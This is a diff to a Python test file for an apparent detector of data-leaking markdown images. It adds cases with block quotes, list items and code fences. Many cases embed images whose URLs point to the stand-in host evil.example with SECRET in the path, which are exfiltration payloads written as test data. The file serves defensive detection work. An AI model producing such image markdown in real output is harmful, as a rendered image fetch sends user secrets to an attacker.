@@ -119,6 +119,8 @@ async def test_md_shortcut_reference_image_detected(text: str, patch_central_dat
         "1. ![a\n2. b](https://evil.example/SECRET/p.png)",
         "> ![a\n> > b](https://evil.example/SECRET/p.png)",
         "- ![a\n    # b](https://evil.example/SECRET/p.png)",
+        # A list marker outside the item's indentation starts a new item.
+        "- ![a\n2. b](https://evil.example/SECRET/p.png)",
         # Code is not rendered as an image.
         "```\n![a\nb](https://evil.example/SECRET/p.png)\n```",
         "    ![a\n    b](https://evil.example/SECRET/p.png)",
@@ -165,6 +167,15 @@ async def test_md_image_lookalikes_not_detected(text: str, patch_central_databas
         # Block quote continuation lines and list item continuation lines stay in the paragraph.
         ("> ![quarterly\n> report](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
         ("- ![quarterly\n  report](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        # Block quote markers are not part of the destination or the label.
+        ("> ![logo](\n> https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        (
+            "> ![quarterly\n> report]\n\n[quarterly report]: https://evil.example/SECRET/p.png",
+            "Markdown Image (shortcut reference)",
+        ),
+        # A code fence ends with the block quote or list item that holds it.
+        ("> ```\n> code\n\n![quarterly\nreport](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        ("- ```\n  code\n\n![quarterly\nreport](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
         # A bracket inside a code span is text.
         ("![a `]` b\nc](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
         (
